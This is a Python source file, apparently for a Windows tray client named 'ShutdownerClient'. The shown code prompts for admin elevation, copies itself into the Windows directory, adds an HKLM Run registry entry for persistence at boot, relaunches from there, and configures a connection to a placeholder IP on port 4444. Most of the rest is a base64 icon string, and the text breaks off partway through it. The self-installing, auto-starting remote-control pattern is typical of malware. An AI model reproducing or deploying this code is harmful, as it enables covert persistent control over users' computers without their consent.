import pystray
from PIL import Image
import base64
from io import BytesIO
import socket
import os
from threading import Thread
import ctypes
import sys
import shutil
import winreg
import time

dest_path=os.environ.get("windir")

def run_as_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    return False

if not os.path.exists(dest_path+"\\ShutdownerClient.exe"):
    run_as_admin()
    try:
        key=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) #accesso negato
        winreg.SetValueEx(key, "ShutdownerClient", 0, winreg.REG_SZ, dest_path+"\\ShutdownerClient.exe")
        winreg.CloseKey(key)
        shutil.copy(sys.argv[0], dest_path)
        time.sleep(0.75)
    except:
        pass

if sys.argv[0]!=dest_path+"\\ShutdownerClient.exe":
    try:
        os.startfile(dest_path+"\\ShutdownerClient.exe")
    except FileNotFoundError:
        os._exit(0)
        sys.exit()

ip="ip-adress"
port=4444
user=os.getlogin()
myip=socket.gethostbyname(socket.gethostname())

def Icon():
    global icon
    base64_image="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